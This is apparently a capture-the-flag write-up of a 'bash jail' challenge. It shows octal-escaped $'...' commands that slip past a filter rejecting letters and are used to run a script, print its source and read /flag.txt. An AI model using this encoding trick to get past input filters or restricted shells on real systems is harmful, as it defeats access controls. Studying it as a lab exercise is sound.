It seems like we are stuck in some kind of bash jail.
Every command seems to return 'Invalid input, bash crashed'

After some trying it seems some characters are actually allowed and mainly any alphabetic characters in the input are being errored on.

At least the following characters are available since it returns the error $ command not found

```
0123456789 
$#/\'
```

This means we could try to generate some commands from converting these. We can easily get the octal value for the requested script and password from cyberchef by using the "To octal"


```
$'\57\160\162\151\156\164\146\154\141\147\56\163\150' 
$'\102\64\163\150\137\142\162\60\124\110\63\162\163'

```

This results in the following error:
`You may not pass!`

After, I decided to verify the contents of the file by using 'cat'

```
$'\143\141\164' $'\57\160\162\151\156\164\146\154\141\147\56\163\150'
```

This gave back the following:
```
#!/bin/bash
if [[ $1 = "B4sh_br0TH3rs" ]]; then
  echo "Congrats, here's your flag:"
  cat /flag.txt
  echo ""
else 
  echo "You may not pass!"
fi
```

Probably the input does not parse correctly for some reason, so the easy solution is to just read the flag with `cat flag.txt`

```
$'\143\141\164' $'\57\146\154\141\147\56\164\170\164'
```

Returning the flag
he2023{gr34t_b4sh_succ3ss!}